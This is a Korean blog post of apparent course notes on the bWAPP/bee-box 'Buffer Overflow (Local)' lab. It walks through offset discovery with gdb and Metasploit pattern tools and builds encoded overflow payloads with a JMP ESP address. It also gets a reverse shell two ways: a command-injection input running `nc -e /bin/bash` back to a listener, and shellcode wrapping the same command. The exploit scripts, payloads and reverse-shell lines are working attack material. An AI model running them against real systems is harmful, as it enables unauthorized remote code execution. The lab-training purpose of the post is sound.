---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - Buffer Overflow(Local)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part9 A9
  - 알려진 취약점이 있는 컴포넌트 사용
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 26강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## Stack BOF 기초

### BOF(Buffer OverFlow)

* 컴퓨터 보안과 프로그래밍에서 사용하는 용어
* 데이터가 버퍼에 써지는동안 **정해진 버퍼를 벗어나 다른 영역을 덮어쓰는 비정상적인 현상**
* 공격자가 원하는 **비정상적인 코드를 실행**할 수 있기 때문에 심각한 취약점으로 분류
* [시연 영상](https://www.youtube.com/watch?v=8zD0sKvu72M)

### 스택과 관계 있는 레지스터

* EBP: 스택 베이스 주소를 가리키는 레지스터
* ESP: 스택 탑 주소를 가리키는 레지스터
* EIP: 다음 실행할 명령어를 가리키는 레지스터 (함수 종료 시 RET Address가 삽입됨)

## Buffer Overflow (Local)

![image](https://user-images.githubusercontent.com/28076542/53471906-91b5b700-3aa9-11e9-9847-25aceac9cdda.png)

* HINT: `\x90*354 + \x8f\x92\x04\x08 + [payload]`
* `\x8f\x92\x04\x08`: JMP ESP로 뒤에 있는 **payload**를 실행함

### bof_1.php

```php
if(isset($_POST["title"]))
    {
        $title = $_POST["title"];
	$title = commandi($title);
        if($title == "")
        {
            echo "<p><font color=\"red\">Please enter a title...</font></p>";
        }
        else
        {
            echo shell_exec("./apps/movie_search " . $title);
        }

    }
```

* **movie_search**라는 프로그램을 사용하는데 여기에 버퍼오버플로를 발생시킬 수 있음

### 1. msfconsole 실행하기

```bash
root@ming:~# msfdb init
A database appears to be already configured, skipping initialization
root@ming:~# msfconsole
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v4.16.15-dev                         ]
+ -- --=[ 1700 exploits - 968 auxiliary - 299 post        ]
+ -- --=[ 503 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
```

### 2. 메타스플로잇 쉘에서 페이로드(ShellCode) 만들기

```bash
msf > use linux/x86/exec
msf payload(exec) > show options

Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute

msf payload(exec) > set cmd /bin/ps
cmd => /bin/ps
msf payload(exec) > generate -b '\x00' -e x86/opt_sub -t raw -f /tmp/payload.txt[*] Writing 205 bytes to /tmp/payload.txt...
msf payload(exec) > exit
```

* 메타스플로잇이 기계어를 만들어줌
* `'-b \x00'`: Bad Character는 `\x00`으로 이를 넣지 말아달라는 옵션
* **generate -b ~~~**: 기계어를 만들고 `/tmp/payload.txt`에 보내달라는 뜻

### 3. payload.txt 확인

```bash
root@ming:~# cat /tmp/payload.txt 
TX-���--P\%%-u0}--P-�t+--P�%�--P-gl�
                                                                              --P-�$`--P-�w}--P-gX--P-�6��--P-9��~--P-�!}--P-�X--P
```

### 4. 웹으로 데이터 전달하기

```bash
root@ming:~# { echo -n \'; cat /tmp/payload.txt; echo -n \'; } | perl -pe's/(.)/sprintf("%%%02x", ord($1))/seg'
%27%54%58%2d%05%fd%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%14%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%08%90%25%e1%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%6c%fe%0b%2d%01%01%01%01%2d%01%01%01%01%50%2d%ac%15%24%60%2d%01%01%01%01%2d%01%01%01%01%50%2d%e7%77%7d%1a%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%04%58%7f%2d%01%01%01%01%2d%01%01%01%01%50%2d%96%36%ba%f7%2d%01%01%01%01%2d%01%01%01%01%50%2d%39%ca%e7%7e%2d%01%01%01%01%2d%01%01%01%01%50%2d%92%0e%21%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%07%e6%58%0e%2d%01%01%01%01%2d%01%01%01%01%50%27
```

### 5. test.py 작성

```python
dummy = '%41' * 354
jmpesp = '%8f%92%04%08'
shellcode = '%27%54%58%2d%05%fd%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%14%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%08%90%25%e1%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%6c%fe%0b%2d%01%01%01%01%2d%01%01%01%01%50%2d%ac%15%24%60%2d%01%01%01%01%2d%01%01%01%01%50%2d%e7%77%7d%1a%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%04%58%7f%2d%01%01%01%01%2d%01%01%01%01%50%2d%96%36%ba%f7%2d%01%01%01%01%2d%01%01%01%01%50%2d%39%ca%e7%7e%2d%01%01%01%01%2d%01%01%01%01%50%2d%92%0e%21%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%07%e6%58%0e%2d%01%01%01%01%2d%01%01%01%01%50%27'

payload = shellcode[:3] + dummy + jmpesp + shellcode[3:]

print payload
```

* `%41` * 354: a를 354개 넣어라, 문제에서 354라 힌트를 줌
* `shellcode[:3]`: `%27`
* `dummy`: a 354개
* `jmpesp`: return
* `shellcode[3:]` : `%54` ~ `%27`

### 6. test.py 실행

```bash
root@ming:~/바탕화면# python test.py
%27%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%8f%92%04%08%54%58%2d%05%fd%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%14%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%08%90%25%e1%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%6c%fe%0b%2d%01%01%01%01%2d%01%01%01%01%50%2d%ac%15%24%60%2d%01%01%01%01%2d%01%01%01%01%50%2d%e7%77%7d%1a%2d%01%01%01%01%2d%01%01%01%01%50%2d%67%04%58%7f%2d%01%01%01%01%2d%01%01%01%01%50%2d%96%36%ba%f7%2d%01%01%01%01%2d%01%01%01%01%50%2d%39%ca%e7%7e%2d%01%01%01%01%2d%01%01%01%01%50%2d%92%0e%21%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%07%e6%58%0e%2d%01%01%01%01%2d%01%01%01%01%50%27
```

### 7. 문제 페이지에 aaaaa를 넣고 BurpSuite로 Intercept 후 페이로드 넣기

![image](https://user-images.githubusercontent.com/28076542/53477152-6e920400-3ab7-11e9-817a-3b02fb923a0c.png)

![image](https://user-images.githubusercontent.com/28076542/53477132-62a64200-3ab7-11e9-8d43-d531418b9cb5.png)

![image](https://user-images.githubusercontent.com/28076542/53477193-85385b00-3ab7-11e9-903e-5bbcf7417134.png)

* 결국 `/bin/ps`를 실행하게 하는 명령어를 삽입한 것

### 8. 결과 확인

![image](https://user-images.githubusercontent.com/28076542/53477438-0b54a180-3ab8-11e9-8ad3-5ed3c2917acb.png)

---

## Buffer overflow (Remote)

![image](https://user-images.githubusercontent.com/28076542/53477495-2f17e780-3ab8-11e9-8530-cfa035a78035.png)

* 직접 해보기

---

## 강의 외 추가 진행

* [참고 웹 페이지](https://ejtaal.net/infosec/beebox.html)

## Buffer Overflow (Local) (Low)

* Security Level이 Low면 다음과 같이 Shell을 얻을 수 있음

### 1. 칼리리눅스 터미널에서 4444 포트 열기

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
```

### 2. 검색창에 다음과 같이 입력

![image](https://user-images.githubusercontent.com/28076542/53556394-16c2ce00-3b87-11e9-92fe-c099d2b087d4.png)

* Search for a movie: `$(nc -e /bin/bash 192.168.190.155 4444)`

### 3. 결과 확인하기

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
192.168.190.143: inverse host lookup failed: Unknown host
connect to [192.168.190.155] from (UNKNOWN) [192.168.190.143] 55276
whoami
www-data
```

## Buffer Overflow (Local) (High)

### 1. 메타스플로잇의 pattern_create.rb로 400 바이트 만들기

```bash
root@ming:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

### 400 패턴 바이트

```txt
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

### 2. Bee-Box에서 movie앱에 위 패턴 글자를 넣고 gdb로 분석

```bash
bee@bee-box:/var/www/bWAPP/apps$ gdb --args ./movie_search "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
GNU gdb 6.8-debian
Copyright (C) 2008 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...
(gdb) run
Starting program: /var/www/bWAPP/apps/movie_search Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
[Thread debugging using libthread_db enabled]
[New Thread 0xb7a866c0 (LWP 27442)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xb7a866c0 (LWP 27442)]
0x41386c41 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0xbfaf9a5a	-1079010726
edx            0x191	401
ebx            0xb7c49ff4	-1211850764
esp            0xbfaf9bc0	0xbfaf9bc0
ebp            0x376c4136	0x376c4136
esi            0xb7f75ce0	-1208525600
edi            0x0	0
eip            0x41386c41	0x41386c41
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

* **0x41386c41 in ?? ()**이라는 오류 메시지가 나옴
* eip 레지스터 주소는 **0x41386c41**
* 따라서 문자열이 eip를 건드린 것을 알 수 있음

### 3. pattern_offset.rb로 오류가 난 eip 레지스터 offset 알아내기

```bash
root@ming:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x41386c41
[*] Exact match at offset 354
```

* pattern_offset.rb: 레지스터를 덮어 씌울 버퍼의 길이를 계산함
* 이게 가능한게 pattern_create.rb로 오버플로를 일으키고 그걸 바탕으로 계산해서 가능
* esp는 스택의 탑을 가리키는 레지스터로 스택 오버플로가 나타나면 확인해야 함

### 4. esp 레지스터 디버깅

```bash
(gdb) x/100cb $esp
0xbfaf9bc0:	108 'l'	57 '9'	65 'A'	109 'm'	48 '0'	65 'A'	109 'm'	49 '1'
0xbfaf9bc8:	65 'A'	109 'm'	50 '2'	65 'A'	109 'm'	51 '3'	65 'A'	109 'm'
0xbfaf9bd0:	52 '4'	65 'A'	109 'm'	53 '5'	65 'A'	109 'm'	54 '6'	65 'A'
0xbfaf9bd8:	109 'm'	55 '7'	65 'A'	109 'm'	56 '8'	65 'A'	109 'm'	57 '9'
0xbfaf9be0:	65 'A'	110 'n'	48 '0'	65 'A'	110 'n'	49 '1'	65 'A'	110 'n'
0xbfaf9be8:	50 '2'	65 'A'	0 '\0'	-73 '�'	39 '\''	0 '\0'	0 '\0'	0 '\0'
0xbfaf9bf0:	0 '\0'	112 'p'	-82 '�'	-73 '�'	0 '\0'	0 '\0'	0 '\0'	0 '\0'
0xbfaf9bf8:	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'
0xbfaf9c00:	48 '0'	29 '\035'	5 '\005'	8 '\b'	48 '0'	-3 '�'	4 '\004'	8 '\b'
0xbfaf9c08:	48 '0'	-3 '�'	4 '\004'	8 '\b'	5 '\005'	0 '\0'	0 '\0'	0 '\0'
0xbfaf9c10:	0 '\0'	32 ' '	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	64 '@'
0xbfaf9c18:	1 '\001'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'	0 '\0'
0xbfaf9c20:	-128 '\200'	51 '3'	-31 '�'	1 '\001'
```

* `x/100cb $esp`: esp(`$esp`) 레지스터 100개의 주소의 바이트 값(`b`), 캐릭터 값(`c`)을 hexadecimal(`x`)로 보여줘라
* [gdb 명령어 참고](http://visualgdb.com/gdbreference/commands/x)
* **l9Am**부터 시작하니 이 오프셋을 확인해야 함

### 5. pattern_offset.rb로 esp 주소 오프셋 확인

```bash
root@ming:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q l9Am
[*] Exact match at offset 358
```

* 354에서 eip가 꽉 채워지고 그 뒤 358부턴 esp에서 채워지고 있음
* **eip가 꽉 채워지면 나머지는 esp로 감**
* **eip에 esp로 점프하라는 명령어를 채워야 함**

### 6. `jmp $esp` 명령어가 바이너리에 있는지 찾고 주소 알아내기

```bash
bee@bee-box:/var/www/bWAPP/apps$ objdump -D ./movie_search | grep jmp.*esp
 804928f:       ff e4                   jmp    *%esp
```

* HINT: `\x90*354 + \x8f\x92\x04\x08 + [payload]`
* `804928f:       ff e4                   jmp    *%esp`
* **804928f** --> **80 04 92 8f** --> **8f 92 04 08** **(리틀엔디언)**
* 명령어 + 페이로드를 전달하면 되는데 `\x00`은 걸러져서 제외시켜야 함
* opt_sub 인코더가 오버플로가 나도 앱을 실행하게 함(SIGSEGV를 발생시키지 않음)
* /bin/ps를 웹에 실행하는 건 강의에서 한 과정과 일치
* reverse shell을 실행시켜 보겠음

### 7. 칼리리눅스에서 4444포트 열기

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
```

### 8. 메타스플로잇으로 payload2.txt 만들고 페이로드 만들기

```bash
msf > use linux/x86/exec
msf payload(exec) > set cmd nc -e /bin/bash 192.168.190.155 4444
cmd => nc -e /bin/bash 192.168.190.155 4444
msf payload(exec) > generate -b '\x00' -e x86/opt_sub -t raw -f /tmp/payload2.txt
[*] Writing 317 bytes to /tmp/payload2.txt...
msf payload(exec) > exit
root@ming:~/바탕화면# { echo -n \'; cat /tmp/payload2.txt; echo -n \'; } | perl -pe's/(.)/sprintf("%%%02x", ord($1))/seg'
%27%54%58%2d%79%fc%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%53%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%12%ca%20%1d%2d%01%01%01%01%2d%01%01%01%01%50%2d%f0%ff%fc%fc%2d%01%02%01%01%2d%01%01%01%01%50%2d%fe%fd%f9%02%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%fd%ff%f5%2d%01%01%02%01%2d%01%01%01%01%50%2d%0c%fe%fa%03%2d%01%01%01%01%2d%01%01%01%01%50%2d%bc%cd%c3%c7%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%f5%02%37%2d%01%01%01%01%2d%01%01%01%01%50%2d%33%02%4c%fe%2d%01%01%01%01%2d%01%01%01%01%50%2d%2b%f5%ba%0c%2d%01%01%01%01%2d%01%01%01%01%50%2d%16%46%61%1e%2d%01%01%01%01%2d%01%01%01%01%50%2d%78%9a%1a%ab%2d%01%01%01%01%2d%01%01%01%01%50%2d%04%58%7f%e7%2d%01%01%01%01%2d%01%01%01%01%50%2d%37%ba%f7%66%2d%01%01%01%01%2d%01%01%01%01%50%2d%ca%e7%7e%95%2d%01%01%01%01%2d%01%01%01%01%50%2d%0f%21%7d%39%2d%01%01%01%01%2d%01%01%01%01%50%2d%e6%58%0e%92%2d%01%01%01%01%2d%01%01%01%01%50%27
```

### 9. test2.py 작성 후 실행

```python
dummy = '%41' * 354
jmpesp = '%8f%92%04%08'
shellcode = '%27%54%58%2d%79%fc%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%53%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%12%ca%20%1d%2d%01%01%01%01%2d%01%01%01%01%50%2d%f0%ff%fc%fc%2d%01%02%01%01%2d%01%01%01%01%50%2d%fe%fd%f9%02%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%fd%ff%f5%2d%01%01%02%01%2d%01%01%01%01%50%2d%0c%fe%fa%03%2d%01%01%01%01%2d%01%01%01%01%50%2d%bc%cd%c3%c7%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%f5%02%37%2d%01%01%01%01%2d%01%01%01%01%50%2d%33%02%4c%fe%2d%01%01%01%01%2d%01%01%01%01%50%2d%2b%f5%ba%0c%2d%01%01%01%01%2d%01%01%01%01%50%2d%16%46%61%1e%2d%01%01%01%01%2d%01%01%01%01%50%2d%78%9a%1a%ab%2d%01%01%01%01%2d%01%01%01%01%50%2d%04%58%7f%e7%2d%01%01%01%01%2d%01%01%01%01%50%2d%37%ba%f7%66%2d%01%01%01%01%2d%01%01%01%01%50%2d%ca%e7%7e%95%2d%01%01%01%01%2d%01%01%01%01%50%2d%0f%21%7d%39%2d%01%01%01%01%2d%01%01%01%01%50%2d%e6%58%0e%92%2d%01%01%01%01%2d%01%01%01%01%50%27'

payload = shellcode[:3] + dummy + jmpesp + shellcode[3:]

print payload
```

```bash
root@ming:~/바탕화면# python test2.py
%27%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%8f%92%04%08%54%58%2d%79%fc%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%53%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%12%ca%20%1d%2d%01%01%01%01%2d%01%01%01%01%50%2d%f0%ff%fc%fc%2d%01%02%01%01%2d%01%01%01%01%50%2d%fe%fd%f9%02%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%fd%ff%f5%2d%01%01%02%01%2d%01%01%01%01%50%2d%0c%fe%fa%03%2d%01%01%01%01%2d%01%01%01%01%50%2d%bc%cd%c3%c7%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%f5%02%37%2d%01%01%01%01%2d%01%01%01%01%50%2d%33%02%4c%fe%2d%01%01%01%01%2d%01%01%01%01%50%2d%2b%f5%ba%0c%2d%01%01%01%01%2d%01%01%01%01%50%2d%16%46%61%1e%2d%01%01%01%01%2d%01%01%01%01%50%2d%78%9a%1a%ab%2d%01%01%01%01%2d%01%01%01%01%50%2d%04%58%7f%e7%2d%01%01%01%01%2d%01%01%01%01%50%2d%37%ba%f7%66%2d%01%01%01%01%2d%01%01%01%01%50%2d%ca%e7%7e%95%2d%01%01%01%01%2d%01%01%01%01%50%2d%0f%21%7d%39%2d%01%01%01%01%2d%01%01%01%01%50%2d%e6%58%0e%92%2d%01%01%01%01%2d%01%01%01%01%50%27
```

* `payload = shellcode[:3] + dummy + jmpesp + shellcode[3:]`에서  **shellcode[:3](%27)**을 앞에 두는 이유는 `%27`이 `"`이기 때문

### 최종 페이로드

```txt
%27%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%8f%92%04%08%54%58%2d%79%fc%fd%fd%2d%01%01%01%01%2d%01%01%01%01%50%5c%25%01%01%01%01%25%02%02%02%02%2d%75%1c%30%7d%2d%01%01%01%01%2d%01%01%01%01%50%2d%53%df%74%2b%2d%01%01%01%01%2d%01%01%01%01%50%2d%12%ca%20%1d%2d%01%01%01%01%2d%01%01%01%01%50%2d%f0%ff%fc%fc%2d%01%02%01%01%2d%01%01%01%01%50%2d%fe%fd%f9%02%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%fd%ff%f5%2d%01%01%02%01%2d%01%01%01%01%50%2d%0c%fe%fa%03%2d%01%01%01%01%2d%01%01%01%01%50%2d%bc%cd%c3%c7%2d%01%01%01%01%2d%01%01%01%01%50%2d%fe%f5%02%37%2d%01%01%01%01%2d%01%01%01%01%50%2d%33%02%4c%fe%2d%01%01%01%01%2d%01%01%01%01%50%2d%2b%f5%ba%0c%2d%01%01%01%01%2d%01%01%01%01%50%2d%16%46%61%1e%2d%01%01%01%01%2d%01%01%01%01%50%2d%78%9a%1a%ab%2d%01%01%01%01%2d%01%01%01%01%50%2d%04%58%7f%e7%2d%01%01%01%01%2d%01%01%01%01%50%2d%37%ba%f7%66%2d%01%01%01%01%2d